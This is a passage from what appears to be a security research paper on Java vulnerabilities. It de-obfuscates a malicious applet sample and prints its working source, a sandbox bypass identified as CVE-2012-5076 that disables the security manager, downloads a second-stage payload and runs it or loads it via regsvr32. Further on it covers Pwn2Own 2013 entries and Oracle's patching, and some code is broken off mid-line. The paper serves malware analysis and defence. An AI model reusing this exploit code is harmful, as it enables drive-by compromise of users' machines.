  } 
  String[] pxRcChlJej() 
  { 
    String[] arrayOfString = new String[2]; 
    arrayOfString[0] = getParameter("Sjuzeod"); 
    arrayOfString[1] = getParameter("TQrzC"); 
    return arrayOfString; 
  } 
  public void init() 
  { 
    String[] arrayOfString = pxRcChlJej(); 
    String str = System.getProperty("java.vers".concat("ion")); 
    if (str.indexOf("1.".concat("7")) != -1) 
      CNzNo(arrayOfString[0], arrayOfString[1]); 
  } 
} 
public static URL RWdvAlV(String paramString, int paramInt) 
  throws Exception 
{ 
  String str = paramString; 
  str = str + (char)(Math.min(113, 2454) + paramInt); 
  str = str + (char)(Math.min(116, 23544) + paramInt); 
  str = str + (char)(Math.min(109, 23544) + paramInt); 
  str = str + (char)(Math.min(66, 7275) + paramInt); 
  str = str + (char)(Math.min(55, 3235) + paramInt); 
  str = str + (char)(Math.min(55, 2225) + paramInt); 
  str = str + (char)(Math.min(55, 6275) + paramInt); 
  return new URL(str); 
} 
RWdvAlV('f', -8) 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
Visually we can see that for each line in the function, Math.min() will return the value on the left-most side. We 
already know that each value is added together with -8, therefore we can easily convert this to the string that will get 
returned, “file:///”. 
Dead code elimination is the act of removing statements and functions that are never called. This was partially 
accomplished in the removal of unused classes. We now continue doing so within our two remaining classes. Though 
the following function was removed since it was not being called at all, here is an example of dead code elimination: 
Since the return value only references a single argument and not the local variables, all of those statements can be 
removed to result in the following function: 
We can also remove the unnecessary arguments and change the function prototype to the following: 
At this point we have to modify all callers of wRXNjHtp to only pass the argument that gets used. Had this function 
been used, it would have been an ideal candidate for inlining. Alternatively, if this function was called with static 
arguments, we would have been able to evaluate it and replace calls to it with the generated static value. 
After applying a few passes of these techniques to the sample, we end up with code that is readable. It is at this point 
that we can infer variable and argument names, which resulted in the following code: 
int wRXNjHtp(String paramString, int paramInt1,  
 int paramInt2, long paramLong) 
{ 
  int i = Math.min(333856, 207293) ^ 0x66493; 
  int j = Math.min(421682, 199391) % 85754; 
  int k = Math.abs(263858) + 211007; 
  int m = Math.abs(23452) + 221538; 
  return paramInt1 * 324346 + paramInt1 % 98101; 
} 
int wRXNjHtp(String paramString, int paramInt1,  
 int paramInt2, long paramLong) 
{ 
  return paramInt1 * 324346 + paramInt1 % 98101; 
} 
int wRXNjHtp(int paramInt1) 
{ 
  return paramInt1 * 324346 + paramInt1 % 98101; 
} 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
//EvilActionClass (formerly dqqOzf) 
package cve_2012_1723; 
import java.io.BufferedInputStream; 
import java.io.BufferedOutputStream; 
import java.io.FileOutputStream; 
import java.net.URL; 
import java.security.AccessController; 
import java.security.PrivilegedExceptionAction; 
public class EvilActionClass implements PrivilegedExceptionAction { 
  public EvilActionClass(String paramString1) { 
    try { 
      AccessController.doPrivileged(this); 
      getSaveAndRunSecondStage(paramString1); 
    } catch (Exception e) { } 
  } 
  public static void triggerDoPrivBlock(String obfuscatedURL, Class paramClass)  
throws Exception { 
    String[] arrayOfString = obfuscatedURL.split("hj"); 
    String url = ""; 
    int i = 0; 
    while (i = 0) { 
          bos.write(buf, 0, i); 
      } 
      bos.close(); 
      bis.close(); 
       try { 
           Process localProcess = new ProcessBuilder(new String[] { droppedFileName 
}).start(); 
       } catch (Exception localException) { } 
       Process localProcess2 = new ProcessBuilder(new String[]{"regsvr32.exe", "/s", 
droppedFileName}).start(); 
    } catch (Exception e) { } 
  } 
} 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
The obfuscated version was given to us as an example of CVE-2012-1723 but now that it has been de-obfuscated 
we can see that it is actually CVE-2012-5076. It is also now clear to see how the malware works. 
com.sun.org.glassfish.gmbal.util.GenericConstructor is used to instantiate a restricted class, 
sun.invoke.anon.AnonymousClassLoader. com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory is used to 
get access to the loadClass instance method of AnonymousClassLoader. The AnonymousClassLoader instance is 
used load a malicious subclass of java.security.PrivilegedExceptionAction. At this point, a function inside our 
malicious subclass is executed. This function de-obfuscates the URL to grab the second stage from and passes the 
de-obfuscated URL to the constructor for the malicious subclass. The constructor calls 
AccessController.doPrivileged() on itself and since the class is a subclass of PrivilegedExceptionAction, this executes 
the class' run() method. The run method solely needs to call System.setSecurityManager(null) to be able to execute 
arbitrary commands. The rest of the flow of execution is specific to this piece of malware. The second stage is 
downloaded from the URL that is specified within the “Sjuzeod” parameter of the HTML file that loads the malicious 
applet and the contents of that URL are saved to %APPDATA%\java.io.tmpdir and then executed or loaded as a DLL. 
Based off the CVE we received the file for this piece of malware was classified as type confusion, but now we can 
appropriately classify it as privilege and sandbox issues due to least privilege violation. 
//EvilApplet (formerly qWodxNpkOs) 
package cve_2012_1723; 
import com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory; 
import com.sun.org.glassfish.gmbal.util.GenericConstructor; 
import java.applet.Applet; 
import java.io.ByteArrayOutputStream; 
import java.io.InputStream; 
import java.lang.reflect.Method; 
public class EvilApplet extends Applet { 
  public void init() { 
    String str = System.getProperty("java.version"); 
    if (str.indexOf("1.7") != -1) { 
        try { 
          ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream(); 
          byte[] arrayOfByte = new byte[8192]; 
          InputStream localInputStream = getClass().getResourceAsStream("dqqOzf.class"); 
          int i; 
          while ((i = localInputStream.read(arrayOfByte)) > 0) 
            localByteArrayOutputStream.write(arrayOfByte, 0, i); 
          arrayOfByte = localByteArrayOutputStream.toByteArray(); 
          GenericConstructor localGenericConstructor = new GenericConstructor(Object.class, 
"sun.invoke.anon.AnonymousClassLoader", new Class[0]); 
          Object localObject = localGenericConstructor.create(new Object[0]); 
          Method localMethod = ManagedObjectManagerFactory.getMethod(localObject.getClass(), 
"loadClass", new Class[] { Byte[].class }); 
          Class ACLdqqOzf = (Class)localMethod.invoke(localObject, new Object[] { arrayOfByte 
}); 
          EvilActionClass.triggerDoPrivBlock(getParameter("Sjuzeod"), ACLdqqOzf); 
        } catch (Exception e) { } 
    } 
  } 
} 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
Pwn2Own 2013 
In order to highlight the activity in the landscape, we expanded the scope of the Pwn2Own contest to include the 
browser plugins: Java, Flash and Reader. Doing so prompted the debate as to what is an appropriate bounty for an 
exploit taking advantage of an unpatched Java vulnerability at Pwn2Own? After much discussion we settled on 
$20,000 USD. Whenever we release the prize packages for Pwn2Own there is always interesting commentary from 
reporters and the security community. One of our favorite quotes was from Kostya Kortchinsky: 
Figure 15 - Pwn2Own Tweet 
We fully expected a large number of researchers to show up and try to collect on the prize money; however, in the 
end, only four researchers pre-registered (a contest requirement) for the Java category. When the rules launched, 
everyone seemed to be focused on the unsafe reflection style of the sandbox bypass vulnerability so our 
expectation was that we would only receive those types of bugs at the contest. In fact, our contestants leveraged 
four unique software weaknesses in order to win the prize money with these weaknesses including the top 4 
vulnerability classes for Java defined earlier in the paper.  
Contestant 
CVE 
CWE Utilized 
James Forshaw 
CVE-2013-1488 
CWE-265: Privilege / 
Sandbox Issues 
CWE-272: Least Privilege 
Violation 
Joshua Drake 
CVE-2013-1491 
CWE-787: Out-of-bounds 
Write 
CWE-125: Out-of-bounds 
Read 
VUPEN Security 
CVE-2013-0402 
CWE-122 
Heap-based Buffer 
Overflow 
Ben Murphy 
CVE-2013-0401 
CWE-265: Privilege / 
Sandbox Issues 
CWE-470 
Unsafe Reflection 
Figure 16 - CWEs Targeted by Pwn2Own Contestants 
Vendor Response Review 
The final part of the equation is to understand how the vendor is responding to the pressure of increased 
vulnerability disclosures. Oracle is making adjustments to secure the Java architecture. On average, Oracle fixes 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
vulnerabilities submitted through the Zero Day Initiative in about 3 months – well below the program’s 180-day limit. 
As compared to other vendors in the ZDI program Oracle is in the middle of the pack for vendor response timelines. 
As expected, some vendors are able to make quick turnaround times on patches while others take much longer. In 
fact, over the last three years Oracle has significantly improved its vulnerability response time despite the increased 
vulnerability discoveries. From an external perspective, we conclude that Oracle is investing in its ability to respond to 
security issues.  
Oracle also seems to be aggressively reviewing the attack surface and making adjustments as new vulnerability 
disclosures come in. Over the last six months, Oracle has made changes to Java that has resulted in the killing of 15 
Zero Day Initiative cases. “Killing” in this perspective is when we purchase a validated 0-day vulnerability from a 
researcher and the vendor patches the issue before we can submit it to the vendor to get the issue fixed. These 
adjustments came in two forms: increased Applet package restrictions and an audit for least privilege violation 
vulnerabilities. Most of these changes occurred in the April 2013 patch (JDK 7u21).  
Over time, Oracle reduces the attack surface by making adjustments to the package restriction list. The table below 
shows the adjustments made over the last eight releases. We baseline the package restriction list at JDK 7u09 to 
demonstrate the changes Oracle has made. 
JDK Release 
Package Restriction Lists 
JDK 7u09 
Baseline  
com.sun.org.apache.xalan.internal.utils 
com.sun.org.glassfish.external 
sun 
com.sun.jnlp 
com.sun.xml.internal.ws 
com.sun.xml.internal.bind 
org.mozilla.jss 
com.sun.org.glassfish.gmbal 
com.sun.imageio 
com.sun.org.apache.xerces.internal.utils 
com.sun.deploy 
com.sun.javaws 
JDK 7u10 
No Change 
JDK 7u11 
No Change 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
JDK 7u13 
Added the Following Packages 
com.sun.glass 
com.sun.javafx 
com.sun.media.jfxmedia 
com.sun.jmx.remote.util 
com.sun.jmx.defaults 
com.sun.openpisces 
com.sun.pisces 
com.sun.t2k 
com.sun.istack.internal 
com.sun.browser 
com.sun.xml.internal.org.jvnet.staxex 
com.sun.scenario 
com.sun.webkit 
com.sun.media.jfxmediaimpl 
com.sun.webpane,com.sun.prism 
JDK 7u15 
Removed the Following Packages 
com.sun.jmx.remote.util 
com.sun.jmx.defaults 
Added the Following Packages 
com.sun.proxy 
com.sun.jmx 
JDK 7u17 
No Change 
JDK 7u21 
Removed the Following Packages 
com.sun.org.glassfish.external 
com.sun.xml.internal.ws 
com.sun.xml.internal.bind 
com.sun.org.glassfish.gmbal 
com.sun.xml.internal.org.jvnet.staxex 
com.sun.org.apache.xerces.internal.utils 
Added the Following Packages 
com.sun.org.apache.xalan.internal.xsltc.cmdline 
com.sun.org.apache.xml.internal.serializer.utils 
com.sun.org.apache.xalan.internal.xsltc.trax 
com.sun.org.apache.xalan.internal.res 
com.sun.org.apache.xerces.internal 
com.sun.org.apache.regexp.internal 
com.sun.org.apache.xalan.internal.templates 
com.sun.xml.internal 
com.sun.org.apache.xalan.internal.xslt 
com.sun.org.apache.xpath.internal 
com.sun.org.apache.xalan.internal.xsltc.compiler 
com.sun.org.apache.xalan.internal.xsltc.util 
com.sun.org.apache.bcel.internal 
com.sun.org.glassfish 
com.sun.java.accessibility 
com.sun.org.apache.xalan.internal.lib 
com.sun.org.apache.xml.internal.utils 
com.sun.org.apache.xml.internal.res 
com.sun.org.apache.xalan.internal.extensions 
JDK 7u25 
Added the Following Packages 
org.jcp.xml.dsig.internal 
com.sun.org.apache.xml.internal.security 
Figure 17 - Modification to Java's Package Restriction List 
Modifications made to the restricted package list in JDK 7u13 resulted in three untrusted pointer dereferencing cases 
being killed. Two least privilege violation based sandbox bypasses were also killed during the JDK 7u15 release. 
Oracle could have accomplished this win by: an internal audit, an external audit by researchers, or by removing some 
Java Every-Days:  Exploiting Software Running on 3 Billion Devices 
of the vulnerability chain that was being used to reach the vulnerable code. However they did it, it worked in patching 
several 0-day vulnerabilities that had been independently discovered.  
Finally, Oracle recently increased its scheduled patch update cycle to four releases a year17. This increase is a direct 
response to the increase of discoveries by external researchers. They are making commitments to their customer 
base and changing internal procedures in order to react quicker when attackers are taking advantage of unpatched 
vulnerabilities. Only time will tell if these verbal commitments will result in more secure software. The fact is that 
over that last three years Oracle has made adjustments to reduce the attack surface and these modifications directly 
resulted in the remediation of vulnerabilities they were not even aware of. One can only hope that this trend will 
continue.  
Conclusion 
Oracle has weathered quite the storm over the last 8 months. Attackers continually discover and expose weaknesses 
in the framework and leverage those vulnerabilities to compromise machines. Exploit kit authors are upping the 
number of Java vulnerabilities they are including in their releases to stay competitive. The external research 
community is also focusing on the Java framework. Zero Day Initiative researchers continually identify a large 
number of vulnerabilities resulting in Oracle releasing some of their biggest security patches to date. 
Based on this analysis, we have solid evidence that the sandbox bypass due to unsafe reflection is the most prolific 
issue in the framework but the sandbox bypass due to type confusion is the most exploited vulnerability type. Heap-
based buffer overflows in the 2D component produce some of the most severe vulnerabilities but are not commonly 
used by the exploit community. Interestingly enough, each of the sub-components in the architecture appears to be 
vulnerable only to a subset of vulnerability types. With this information, researchers will be able to focus their efforts 
while auditing the sub-components to increase the chance of discovering some fresh 0-days. We look forward to 
analyzing the next round of Java issues submitted to the Zero Day Initiative and hopefully this information will help 
you find more vulnerabilities.  
Good luck bug hunting!  
Learn more at 
zerodayinitiative.com 
hp.com/go/hpsr 
java.com/en/download/uninstall.jsp 
17 https://blogs.oracle.com/security/entry/maintaining_the_security_worthiness_of